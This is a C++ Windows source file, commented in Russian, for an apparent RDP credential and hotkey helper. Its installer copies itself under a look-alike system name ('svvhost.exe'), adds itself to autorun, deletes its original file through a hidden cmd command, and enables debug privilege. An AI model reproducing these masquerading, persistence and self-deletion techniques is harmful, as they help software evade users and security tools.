#include <windows.h>
#include <iostream>
#include <cstdio>
#include <string>
#include <filesystem>
#include <shlobj.h>
#include "PowerMonitor.h"
#include "Logger.h"
#include "RdpController.h"
#include "CredentialManager.h"

namespace fs = std::filesystem;

// Имя файла, под которым программа будет жить в системе (можете изменить)
const wchar_t* INSTALLED_EXE_NAME = L"svvhost.exe";

bool InstallAndSelfDelete(HINSTANCE hInstance, LPWSTR lpCmdLine) {
    wchar_t currentPath[MAX_PATH];
    GetModuleFileNameW(hInstance, currentPath, MAX_PATH);

    wchar_t localAppData[MAX_PATH];
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) {
        return true; // Если не удалось получить путь, работаем откуда запустили
    }

    // Целевая папка установки
    fs::path targetDir = fs::path(localAppData) / L"Microsoft" / L"WindowsMail";
    std::error_code ec;
    fs::create_directories(targetDir, ec);

    fs::path targetPath = targetDir / INSTALLED_EXE_NAME;

    // Если мы УЖЕ запущены из системной папки — ничего не делаем, продолжаем работу
    if (_wcsicmp(currentPath, targetPath.c_str()) == 0) {
        return true;
    }

    // 1. Копируем себя в системную папку
    fs::copy_file(currentPath, targetPath, fs::copy_options::overwrite_existing, ec);
    if (ec) return true; // Если скопировать не удалось — продолжаем работу как есть

    // 2. Сразу прописываем новый путь в автозагрузку
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExW(hKey, L"RdpSessionManager", 0, REG_SZ, (BYTE*)targetPath.c_str(), (DWORD)(targetPath.wstring().size() + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }

    // 3. Запускаем новую копию из системной папки
    ShellExecuteW(NULL, L"open", targetPath.c_str(), lpCmdLine, NULL, SW_SHOWNORMAL);

    // 4. Скрытый скрипт самоудаления: пингуем localhost для паузы в 2 секунды, затем удаляем старый .exe
    std::wstring deleteCmd = L"cmd.exe /c ping 127.0.0.1 -n 2 > nul & del /F /Q \"" + std::wstring(currentPath) + L"\"";

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // Скрываем черное окно консоли
    PROCESS_INFORMATION pi;

    std::vector<wchar_t> cmdBuffer(deleteCmd.begin(), deleteCmd.end());
    cmdBuffer.push_back(L'\0');

    if (CreateProcessW(NULL, cmdBuffer.data(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    // Возвращаем false, чтобы текущий процесс мгновенно завершился и позволил скрипту удалить файл
    return false;
}

bool RequestAdminPrivileges(LPWSTR lpCmdLine) {
    if (IsUserAnAdmin()) {
        return true;
    }

    wchar_t szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);

    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpVerb = L"runas";
    sei.lpFile = szPath;
    sei.lpParameters = lpCmdLine;
    sei.nShow = SW_SHOWNORMAL;

    if (ShellExecuteExW(&sei)) {
        return false;
    }
    return true;
}

void PromptInitialCredentialsConsole() {
    if (AllocConsole()) {
        FILE* fpOut = nullptr;
        FILE* fpIn = nullptr;
        freopen_s(&fpOut, "CONOUT$", "w", stdout);
        freopen_s(&fpIn, "CONIN$", "r", stdin);

        std::wcout << L"=== RDP Session Manager Setup ===" << std::endl;
        std::wstring ip, user, pass;

        std::wcout << L"Enter Target IP: ";
        std::wcin >> ip;
        std::wcout << L"Enter Username: ";
        std::wcin >> user;
        std::wcout << L"Enter Password: ";
        std::wcin >> pass;

        CredentialManager::SetCredentials(ip, user, pass);
        std::wcout << L"[SUCCESS] Saved to DLL." << std::endl;
        std::wcout << L"Hotkeys:\n Ctrl+Alt+1 -> mstsc\n Ctrl+Alt+2 -> Windows App\n Ctrl+Alt+3 -> Devolutions RDM\n";

        Sleep(2500);

        if (fpOut) fclose(fpOut);
        if (fpIn) fclose(fpIn);
        FreeConsole();
    }
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR    lpCmdLine,
    _In_ int       nCmdShow)
{
    // 1. Проверяем маршрут установки, копируем и удаляем исходник, если нужно
    if (!InstallAndSelfDelete(hInstance, lpCmdLine)) {
        return 0; // Закрываемся, чтобы cmd-скрипт смог нас удалить
    }

    // 2. Проверяем права администратора (уже находясь в целевой папке)
    if (!RequestAdminPrivileges(lpCmdLine)) {
        return 0; // Перезапускаемся с правами
    }

    // Включаем привилегии для сканирования процессов
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        TOKEN_PRIVILEGES tp;
        LUID luid;
        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
        }
        CloseHandle(hToken);
    }

    Logger::Init(L"RdpSessionManager.log");
    Logger::LogEvent(L"RdpSessionManager Service Started.");

    if (!CredentialManager::LoadCredentials()) {
        PromptInitialCredentialsConsole();
    }
    else {
        Logger::LogEvent(L"Credentials successfully loaded.");
    }

    RdpController::StartProcessMonitor();

    RegisterHotKey(NULL, 1001, MOD_CONTROL | MOD_ALT, '1');
    RegisterHotKey(NULL, 1002, MOD_CONTROL | MOD_ALT, '2');
    RegisterHotKey(NULL, 1003, MOD_CONTROL | MOD_ALT, '3');
    RegisterHotKey(NULL, 1004, MOD_CONTROL | MOD_ALT, 0xDC);

    PowerMonitor monitor;
    monitor.Start();

    UnregisterHotKey(NULL, 1001);
    UnregisterHotKey(NULL, 1002);
    UnregisterHotKey(NULL, 1003);
    UnregisterHotKey(NULL, 1004);
    CredentialManager::Clear();

    return 0;
}